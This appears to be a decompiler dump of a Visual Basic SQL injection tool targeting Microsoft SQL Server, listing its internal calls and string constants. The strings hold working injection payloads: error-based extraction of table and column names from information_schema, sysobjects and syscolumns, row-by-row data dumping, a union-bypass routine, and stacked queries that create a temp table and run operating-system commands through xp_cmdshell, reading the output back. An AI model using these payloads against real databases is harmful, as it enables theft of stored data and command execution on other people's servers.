'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "Failed to get table no. "
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "TEMP"
'N  * ref: vbCrLf
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_203()
'N  * ref: __vbaExceptHandler
'N  * ref: Subr_194
'N  * ref: __vbaVarCat
'N  * ref: "table_name="
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "*"
'N  * ref: __vbaStrCopy
'N  * ref: "information_schema.columns"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_204
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaStrCat
'N  * ref: "column_name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: "."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_194
'N  * ref: "(char(126)%2b(select distinct top 1 "
'N  * ref: " from (select distinct top 1 column_name from "
'N  * ref: "information_schema.columns where table_name="
'N  * ref: " order BY column_name ASC) sq order BY column_name DESC)%2bchar(126))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: "is not a valid user in database '"
'N  * ref: LCase(
'N  * ref: "'"
'N  * ref: LCase(
'N  * ref: "is not able to access the database &quot;"
'N  * ref: LCase(
'N  * ref: "&quot;"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "*converting the *varchar value '~(*)~' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: "Trying another method..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Error: Access dennied!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: "column_name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: __vbaStrCat
'N  * ref: "."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_194
'N  * ref: "(char(126)%2b(select distinct top 1 "
'N  * ref: " from (select distinct top "
'N  * ref: " column_name from "
'N  * ref: "information_schema.columns where table_name="
'N  * ref: " order BY column_name ASC) sq order BY column_name DESC)%2bchar(126))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "*converting the *varchar value '~(*)~' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: "Column found: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaObjSet
'N  * ref: Subr_191
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarSetObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarLateMemCallLdRf
'N  * ref: __vbaVarLateMemSt
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarForInit
'N  * ref: "column_name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: "."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_194
'N  * ref: "(char(126)%2b(select distinct top 1 "
'N  * ref: " from (select distinct top "
'N  * ref: " column_name from "
'N  * ref: "information_schema.columns where table_name="
'N  * ref: " order BY column_name ASC) sq order BY column_name DESC)%2bchar(126))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "*converting the *varchar value '~(*)~' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: vbCrLf
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Column found: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaObjSet
'N  * ref: Subr_191
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarSetObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarCmpLt
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: "Failed to get column no. "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "TEMP"
'N  * ref: vbCrLf
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarForNext
'N  * ref: __vbaBoolVar
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_194
'N  * ref: "id=(select id from "
'N  * ref: "sysobjects where name="
'N  * ref: ")"
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "name"
'N  * ref: __vbaStrCopy
'N  * ref: "syscolumns"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_204
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaVarMove
'N  * ref: "name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_194
'N  * ref: "(char(82)%2bchar(33)%2b(select distinct top 1 "
'N  * ref: " from "
'N  * ref: "syscolumns where id=(select id from "
'N  * ref: "sysobjects where name="
'N  * ref: "))%2bchar(33)%2bchar(82))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCopy
'N  * ref: "name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_194
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_194
'N  * ref: "sysobjects where name="
'N  * ref: "(char(82)%2bchar(33)%2b(select distinct top 1 "
'N  * ref: " from "
'N  * ref: "syscolumns where id=(select id from "
'N  * ref: ")  and name not in (select distinct top "
'N  * ref: " name from "
'N  * ref: "syscolumns where id=(select top 1 id from "
'N  * ref: ")))%2bchar(33)%2bchar(82))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "R!(.*?)!R"
'N  * ref: Subr_165
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: "Column found: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaObjSet
'N  * ref: Subr_191
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarSetObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarLateMemCallLdRf
'N  * ref: __vbaVarLateMemSt
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpLt
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: "name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_194
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_194
'N  * ref: "sysobjects where name="
'N  * ref: "(char(82)%2bchar(33)%2b(select distinct top 1 "
'N  * ref: " from "
'N  * ref: "syscolumns where id=(select id from "
'N  * ref: ")  and name not in (select distinct top "
'N  * ref: " name from "
'N  * ref: "syscolumns where id=(select top 1 id from "
'N  * ref: ")))%2bchar(33)%2bchar(82))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "R!(.*?)!R"
'N  * ref: Subr_165
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: "Column found: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaObjSet
'N  * ref: Subr_191
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: "."
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarSetObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_204()
'N  * ref: __vbaExceptHandler
'N  * ref: IIf(
'N  * ref: __vbaVarCat
'N  * ref: "["
'N  * ref: __vbaVarCopy
'N  * ref: "]"
'N  * ref: __vbaVarCopy
'N  * ref: "*"
'N  * ref: __vbaStrCmp
'N  * ref: "count("
'N  * ref: ")"
'N  * ref: Subr_201
'N  * ref: ".."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCmp
'N  * ref: "(char(82)%2bchar(33)%2b(select top 1 "
'N  * ref: " from "
'N  * ref: " )%2bchar(33)%2bchar(82))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: "permission denied on object '"
'N  * ref: LCase(
'N  * ref: "'"
'N  * ref: LCase(
'N  * ref: " is not a valid user in database '"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "R!(.*?)!R"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: "Bypassing illegal union failed! Turning off this feature"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Error: Access dennied!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaStrVarVal
'N  * ref: Val(
'N  * ref: __vbaFpI4
'N  * ref: __vbaFreeStr
'N  * ref: "["
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrCat
'N  * ref: "Count("
'N  * ref: __vbaStrMove
'N  * ref: ") of "
'N  * ref: "["
'N  * ref: "]"
'N  * ref: " is "
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "["
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrCat
'N  * ref: "Can not get Count(["
'N  * ref: __vbaStrMove
'N  * ref: "]) of "
'N  * ref: "["
'N  * ref: "]"
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_205()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarCopy
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarIndexLoad
'N  * ref: "isnull(["
'N  * ref: "],char(32))"
'N  * ref: "cast(isnull(["
'N  * ref: "],char(32)) as nvarchar(4000))"
'N  * ref: __vbaVarIndexLoad
'N  * ref: IIf(
'N  * ref: "%2bchar(94)%2b"
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: "["
'N  * ref: "],"
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaStrCmp
'N  * ref: IsArray(
'N  * ref: Subr_193
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "(char(82)%2bchar(33)%2b(select top 1 "
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: " from (select top "
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrI4
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: " "
'N  * ref: " from "
'N  * ref: "["
'N  * ref: "]"
'N  * ref: " order by ["
'N  * ref: "] asc) sq order by ["
'N  * ref: "] desc)%2bchar(33)%2bchar(82))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaStrCat
'N  * ref: "isnull(["
'N  * ref: __vbaStrMove
'N  * ref: "],char(32))"
'N  * ref: Subr_201
'N  * ref: "["
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "(char(82)%2bchar(33)%2b(select top 1 "
'N  * ref: " from (select top "
'N  * ref: " "
'N  * ref: " from "
'N  * ref: "["
'N  * ref: "]"
'N  * ref: " order by ["
'N  * ref: "] asc) sq order by ["
'N  * ref: "] desc)%2bchar(33)%2bchar(82))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "R!(.*?)!R"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstEq
'N  * ref: "*converting the *varchar value 'R!(*)...*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: Trim(
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaFreeVar
'N  * ref: "Bypassing illegal union failed! Turning off this feature"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Trying another method..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_188
'N  * ref: "Data Found(too long!): "
'N  * ref: __vbaStrMove
'N  * ref: "="
'N  * ref: Subr_143
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_188
'N  * ref: "Data Found: "
'N  * ref: "="
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCopy
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_206()
'N  * ref: __vbaExceptHandler
'N  * ref: "Creating temp table"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: "; CREATE TABLE r3dm0v3_sql (tmp1 varchar(8000),tmp2 varchar(8000))--"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaInStr
'N  * ref: "Connection is busy with results for another"
'N  * ref: "Creating temp table successful"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Creating temp table failed"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Executing and dumping results into temp table"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: "; insert into r3dm0v3_sql (tmp1) exec master..xp_cmdshell '"
'N  * ref: "'--"
'N  * ref: __vbaVarCat
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaInStr
'N  * ref: "Connection is busy with results for another"
'N  * ref: "Executing and dumping successful"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Executing and dumping failed"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Merging results"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarCat
'N  * ref: "; begin declare @ret varchar(8000) set @ret='' select @ret=@ret%2b'~'%2btmp1 from r3dm0v3_sql where tmp1>@ret insert into r3dm0v3_sql(tmp2) select @ret end--"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaInStr
'N  * ref: "Connection is busy with results for another"
'N  * ref: __vbaVarDup
'N  * ref: "Merging results successful"
'N  * ref: Subr_143
'N  * ref: __vbaVarDup
'N  * ref: "Merging results failed"
'N  * ref: Subr_143
'N  * ref: "Fetching results"
'N  * ref: Subr_143
'N  * ref: "char(126)%2bcast(tmp2 as varchar(8000))"
'N  * ref: Subr_193
'N  * ref: __vbaStrMove
'N  * ref: "(select top 1 "
'N  * ref: __vbaStrCat
'N  * ref: "%2bchar(126) from r3dm0v3_sql where tmp2<>'')"
'N  * ref: __vbaStrCat
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: "*converting the varchar value '~(*)~' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstEq
'N  * ref: "*converting the varchar value '(*)...*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarMove
'N  * ref: "Results received ("
'N  * ref: " bytes)"
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: Mid(
'N  * ref: vbCrLf
'N  * ref: "~"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: "Fetching results"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "substring(char(126)%2bcast(tmp2 as varchar(8000)),"
'N  * ref: ",400)"
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: Subr_193
'N  * ref: "(select top 1 "
'N  * ref: __vbaStrCat
'N  * ref: "%2bchar(126) from r3dm0v3_sql where tmp2<>'')"
'N  * ref: __vbaStrCat
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: "*converting the varchar value '~(*)~' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstEq
'N  * ref: "*converting the varchar value '(*)...*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: "Results received ("
'N  * ref: " bytes)"
'N  * ref: __vbaLenVar
